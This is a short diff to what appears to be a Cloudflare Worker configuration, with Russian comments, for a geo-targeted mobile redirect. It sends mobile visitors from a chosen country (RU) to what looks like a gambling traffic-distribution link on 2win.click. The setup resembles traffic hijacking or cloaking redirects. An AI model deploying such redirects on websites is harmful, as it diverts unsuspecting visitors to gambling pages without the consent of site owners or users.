@@ -1,4 +1,4 @@
-name = "ru-mobile-redirect"
+name = "geo-mobile-redirect"
 main = "src/worker.js"
 compatibility_date = "2024-06-01"
 
@@ -11,11 +11,11 @@ compatibility_date = "2024-06-01"
 # Базовые переменные можно задать здесь и при необходимости раскомментировать.
 
 [vars]
-# URL, на который будет перенаправляться мобильный RU-трафик по умолчанию
+# URL, на который будет перенаправляться мобильный трафик по умолчанию
 FALLBACK_URL = "https://2win.click/tds/go.cgi?4&bonus=bet"
 # Страна, трафик из которой будет редиректиться
 REDIRECT_COUNTRY = "RU"
 # Отключить редирект полностью
-DISABLE_RU_MOBILE_REDIRECT = "false"
+DISABLE_MOBILE_REDIRECT = "false"
 # Считать iPad мобильным устройством
 INCLUDE_IPAD = "false"
